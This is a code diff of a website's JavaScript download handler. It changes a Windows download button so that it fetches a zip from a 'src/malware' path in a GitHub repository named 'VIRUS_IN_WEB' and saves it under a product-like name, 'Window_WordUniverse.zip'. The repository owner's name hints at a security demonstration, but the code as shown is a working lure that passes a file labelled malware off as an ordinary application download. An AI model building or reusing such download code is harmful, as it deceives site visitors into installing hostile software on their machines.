@@ -1,4 +1,4 @@
-export default function Download_Android() {
+export default function Download_Windows() {
     const downloadButton = document.getElementById('Windows');
 
     downloadButton.addEventListener('click', handleDownload);
@@ -10,15 +10,15 @@ export default function Download_Android() {
         if (!isDownloading) {
             isDownloading = true;
 
-            const fileURL = 'https://github.com/KGV-Security/VIRUS_IN_WEB/raw/88e3f772c3827a875246a95e89e1a9dae012214e/src/malware/WordUniverse.zip';
+            const fileURL = 'https://raw.githubusercontent.com/KGV-Security/VIRUS_IN_WEB/main/src/malware/WordUniverse.zip';
             const fileName = 'Window_WordUniverse.zip';
 
-            const d = document.createElement('a');
-            d.href = fileURL;
-            d.download = fileName;
-            document.body.appendChild(d);
-            d.click();
-            document.body.removeChild(d);
+            const a = document.createElement('a');
+            a.href = fileURL;
+            a.download = fileName;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
 
             // 다운로드가 완료되었을 때 버튼을 활성화
             isDownloading = false;
